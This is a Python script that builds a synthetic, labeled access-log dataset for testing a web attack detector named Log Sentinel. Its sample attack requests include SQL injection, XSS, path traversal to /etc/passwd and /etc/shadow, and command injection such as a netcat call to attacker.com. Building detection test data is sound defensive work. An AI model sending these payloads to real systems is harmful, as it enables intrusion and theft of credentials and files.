#!/usr/bin/env python3
"""Generate a reproducible labeled dataset for Log Sentinel evaluation."""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUTPUT_FILE = Path(__file__).parent / "dataset.jsonl"
SEED = 42


def make_line(ip, ts, path, status=200, ua="Mozilla/5.0"):
    timestamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{timestamp}] "GET {path} HTTP/1.1" {status} 1234 "-" "{ua}"'


def main():
    random.seed(SEED)
    now = datetime(2026, 2, 21, 10, 0, 0)

    benign_paths = [
        "/", "/home", "/about", "/products?id=2", "/search?q=phone", "/login", "/cart", "/blog/1"
    ]

    records = []

    # Benign traffic
    for i in range(120):
        ip = f"192.168.1.{random.randint(2, 40)}"
        path = random.choice(benign_paths)
        ts = now + timedelta(seconds=i)
        records.append({
            "id": f"benign-{i+1}",
            "label": "benign",
            "expected_type": None,
            "line": make_line(ip, ts, path, status=200, ua="Mozilla/5.0")
        })

    # SQLi
    sqli_payloads = [
        "/login.php?id=1' UNION SELECT 1--",
        "/item?id=1 OR 1=1",
        "/search?q=' UNION ALL SELECT password FROM users--",
        "/product?id=1%27%20UNION%20SELECT%201--"
    ]
    for i in range(40):
        ts = now + timedelta(minutes=5, seconds=i)
        path = random.choice(sqli_payloads)
        records.append({
            "id": f"sqli-{i+1}",
            "label": "attack",
            "expected_type": "SQL Injection",
            "line": make_line("203.0.113.10", ts, path, status=200, ua="curl/8.0")
        })

    # XSS
    xss_payloads = [
        "/comment?text=<script>alert(1)</script>",
        "/profile?bio=<img src=x onerror=alert(1)>",
        "/chat?m=<svg onload=alert(1)>"
    ]
    for i in range(35):
        ts = now + timedelta(minutes=10, seconds=i)
        path = random.choice(xss_payloads)
        records.append({
            "id": f"xss-{i+1}",
            "label": "attack",
            "expected_type": "Cross-Site Scripting",
            "line": make_line("10.1.1.5", ts, path, status=200, ua="Firefox/120.0")
        })

    # Traversal
    trav_payloads = [
        "/download?file=../../../../etc/passwd",
        "/view?page=..\\..\\windows\\win.ini",
        "/file?path=...%2F...%2Fetc%2Fshadow"
    ]
    for i in range(30):
        ts = now + timedelta(minutes=15, seconds=i)
        path = random.choice(trav_payloads)
        records.append({
            "id": f"trav-{i+1}",
            "label": "attack",
            "expected_type": "Path Traversal",
            "line": make_line("172.16.2.9", ts, path, status=404, ua="wget/1.20")
        })

    # Command injection
    cmdi_payloads = [
        "/ping?host=8.8.8.8;cat /etc/passwd",
        "/exec?cmd=ls|nc attacker.com 4444",
        "/run?arg=$(whoami)"
    ]
    for i in range(30):
        ts = now + timedelta(minutes=20, seconds=i)
        path = random.choice(cmdi_payloads)
        records.append({
            "id": f"cmdi-{i+1}",
            "label": "attack",
            "expected_type": "Command Injection",
            "line": make_line("198.51.100.20", ts, path, status=500, ua="Python/3.11")
        })

    # Scanner UA
    scanner_uas = ["sqlmap/1.7", "Nikto/2.5", "nuclei/3.0", "masscan/1.3"]
    for i in range(25):
        ts = now + timedelta(minutes=25, seconds=i)
        ua = random.choice(scanner_uas)
        records.append({
            "id": f"scan-{i+1}",
            "label": "attack",
            "expected_type": "Security Scanner",
            "line": make_line("198.18.0.9", ts, "/admin", status=404, ua=ua)
        })

    random.shuffle(records)

    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with OUTPUT_FILE.open("w", encoding="utf-8") as f:
        for rec in records:
            f.write(json.dumps(rec) + "\n")

    print(f"dataset_written={OUTPUT_FILE}")
    print(f"total_records={len(records)}")


if __name__ == "__main__":
    main()
